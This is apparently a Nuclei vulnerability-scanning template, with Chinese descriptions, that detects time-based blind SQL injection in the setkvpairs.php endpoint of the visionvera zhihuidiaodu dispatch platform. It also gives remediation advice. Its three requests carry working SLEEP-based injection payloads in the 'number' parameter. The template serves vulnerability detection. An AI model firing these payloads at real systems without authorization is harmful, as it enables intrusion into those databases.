id: visionvera-zhihuidiaodu-setkvpairs-php-sqli

info:
  name: visionvera zhihuidiaodu setkvpairs.php SQL注入
  author: bl
  severity: high
  tags: 指挥调度管理平台
  description: |-
    该模板用于识别 visionvera zhihuidiaodu 组件中 setkvpairs.php 端点存在的SQL注入漏洞。攻击者可向受影响端点提交恶意构造的输入，干扰后端数据库查询逻辑，可能导致未授权数据读取、篡改或破坏。具体影响取决于目标版本、运行配置及端点暴露程度。
  remediation: >-
    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
  
variables:
  randSecond1: '{{rand_int(6, 8)}}'
  randSecond2: '{{rand_int(2, 3)}}'

flow: http(1) && http(2) && http(3)

http:
  - method: POST
    path:
      - '{{BaseURL}}/api/client/setkvpairs.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: number=1' AND (SELECT 4068 FROM (SELECT(SLEEP(0)))Vsc)-- Q&key=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: word
        words:
          - "Call to undefined function mysql_error()"
        part: body
        internal: true
  - method: POST
    path:
      - '{{BaseURL}}/api/client/setkvpairs.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: number=1' AND (SELECT 4068 FROM (SELECT(SLEEP({{randSecond1}})))Vsc)-- Q&key=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true
      - type: dsl
        dsl:
          - duration - duration_1 >= randSecond1 * 1 - 0.5
        condition: and
        internal: true
  - method: POST
    path:
      - '{{BaseURL}}/api/client/setkvpairs.php'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: number=1' AND (SELECT 4068 FROM (SELECT(SLEEP({{randSecond2}})))Vsc)-- Q&key=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration - duration_1 >= randSecond2 * 1 - 0.5
        condition: and
